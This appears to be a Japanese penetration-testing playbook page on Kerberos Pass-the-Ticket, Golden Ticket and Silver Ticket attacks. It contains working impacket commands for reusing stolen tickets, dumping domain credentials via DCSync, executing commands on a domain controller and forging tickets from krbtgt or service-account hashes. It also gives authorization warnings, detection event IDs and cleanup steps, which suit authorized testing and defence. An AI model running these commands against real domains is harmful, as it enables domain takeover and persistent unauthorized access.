# Pass-The-Ticket（PTT）

> **スコープ**: Kerberos チケット（TGT / TGS）を取得し、それを使って対象システムへ認証する攻撃手法。チケット使用〜Golden Ticket（krbtgt ハッシュから TGT を偽造）〜Silver Ticket（サービスアカウントハッシュから TGS を偽造）まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [x] 持続化に該当（Golden Ticket は krbtgt ハッシュでドメイン全体のチケットを偽造可能、デフォルト有効期限 10 年）
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（Event ID 4769 / 4624 Type 3、異常なチケット属性で検知）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件

- `.ccache` 形式または `.kirbi` 形式のチケットファイルが手元にある
- DC の TGT（Unconstrained Delegation 攻撃や RBCD 後）
- DCSync 後に secretsdump で取得した krbtgt ハッシュがある（Golden Ticket 作成可能）

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `impacket-ticketer` / `impacket-psexec` / `impacket-smbclient` / `impacket-secretsdump`（いずれもペネトレ用 Linux ディストリ標準搭載）/ `klist`（ccache 確認）
- 外部リソース依存: なし（内部ネットワーク内で完結）

## 先に確認すること

- **時刻同期**: 時刻のずれが 5 分を超えると `KRB_AP_ERR_SKEW` エラーが発生する → `sudo ntpdate [DC_IP]` で同期
- **チケットの有効期限**: TGT は通常 10 時間、TGS は通常 1 時間

**攻撃者の思考トレース:** NTLM ハッシュを使う Pass-The-Hash と異なり、Kerberos 認証を利用する。Unconstrained Delegation や RBCD 後に TGT を取得した場合、または DCSync で krbtgt ハッシュを取得した場合に発火する。Golden Ticket はドメイン全体の持続化に直結するため高インパクト。

---

## 1. チケットの使用（Linux 側）

**コマンド:**

```bash
# [Attacker] 環境変数でチケットを指定
export KRB5CCNAME=/path/to/ticket.ccache

# [Attacker] チケットを使って SMB アクセス
impacket-smbclient -k -no-pass [DC_FQDN]

# [Attacker] チケットを使って DCSync
impacket-secretsdump -k -no-pass administrator@[DC_FQDN]

# [Attacker] チケットを使ってコマンド実行
impacket-psexec -k -no-pass administrator@[DC_FQDN]

# [Attacker] チケットの確認
klist
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| SMB / DCSync / psexec が成功 | PTT 成立 | 目的の操作を実行 |
| `KRB_AP_ERR_SKEW` | 時刻ずれ 5 分超 | `sudo ntpdate [DC_IP]` で同期 |
| `KRB5CCNAME` のパスに `$` が含まれる（コンピューターアカウント）| クォートが必要 | `export KRB5CCNAME="DC1\$@DOMAIN_krbtgt@DOMAIN.ccache"` |

**注意:** `-k -no-pass` オプションセットで Kerberos 認証を使用することを明示する。

---

## 2. Golden Ticket（krbtgt ハッシュから TGT を偽造）

**着火条件:** DCSync または他の手法で `krbtgt` の NTLM ハッシュが取得できた場合。

**コマンド:**

```bash
# [Attacker] ドメイン SID の取得
impacket-getPac -targetUser administrator '[DOMAIN]/[USER]:[PASSWORD]' | grep "Domain SID"
# または
impacket-lookupsid '[DOMAIN]/[USER]:[PASSWORD]@[DC_IP]' | grep "Domain SID"

# [Attacker] Golden Ticket の作成
impacket-ticketer \
  -nthash [KRBTGT_NTLM_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  Administrator
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Administrator.ccache` が作成される | Golden Ticket 作成成功 | §1 のチケット使用方法でドメイン全体へのアクセス |

**注意:** Golden Ticket はデフォルト有効期限 10 年。テスト完了後は krbtgt のパスワードを 2 回ローテーションする運用が必要（対象組織へ依頼）。

---

## 3. Silver Ticket（サービスアカウントハッシュから TGS を偽造）

**着火条件:** 特定のサービス（CIFS / HTTP / LDAP 等）のアカウントハッシュを取得済み。

**コマンド:**

```bash
# [Attacker] Silver Ticket の作成（特定サービスへのアクセスのみ可能）
impacket-ticketer \
  -nthash [SERVICE_ACCOUNT_NTLM_HASH] \
  -domain-sid [DOMAIN_SID] \
  -domain [DOMAIN] \
  -spn [SPN] \
  Administrator
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| チケットが作成される | Silver Ticket 作成成功 | §1 のチケット使用方法で当該サービスへのアクセス |

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 時刻ずれが 5 分超 | `sudo ntpdate [DC_IP]` で同期 |
| チケットが拒否される | チケットの有効期限切れ | 新しいチケットを取得 |
| krbtgt ハッシュが取得できない | DCSync 権限がない | `../Credential_Dumping.md` で別の手法 |

---

## 注意点・落とし穴

- チケットには有効期限がある（TGT は通常 10 時間、TGS は通常 1 時間）
- `KRB5CCNAME` のパスに `$` が含まれる場合（コンピューターアカウントのccache）はクォートが必要

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。Golden Ticket は krbtgt ハッシュ取得後の追加攻撃であり、ドメイン全体に対する持続化に直結する
- **想定されるSIEM/EDR検知**: Event ID 4769（Kerberos サービスチケット要求）/ Event ID 4624 Type 3（ネットワークログオン）/ Golden Ticket 特有の異常（チケット有効期限がデフォルト値から逸脱、未知のドメインユーザー名等）
- **業務影響リスク**: なし（参照のみであれば直接の業務影響はないが、krbtgt 流出が記録に残る）
- **原状回復必須項目**: ✅ 偽造したチケットファイル（`.ccache` / `.kirbi`）の破棄 / ✅ Golden Ticket は失効させるため、テスト完了後 krbtgt のパスワードを 2 回ローテーションする運用が必要（対象組織へ依頼）/ ✅ 取得した krbtgt ハッシュは暗号化保管 → テスト完了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：`../Delegation_Attacks/Unconstrained.md`（TGT の取得）
- 前：`../Delegation_Attacks/RBCD.md`（TGS の取得・RBCD 後）
- 前：`../Credential_Dumping.md`（krbtgt ハッシュの取得）
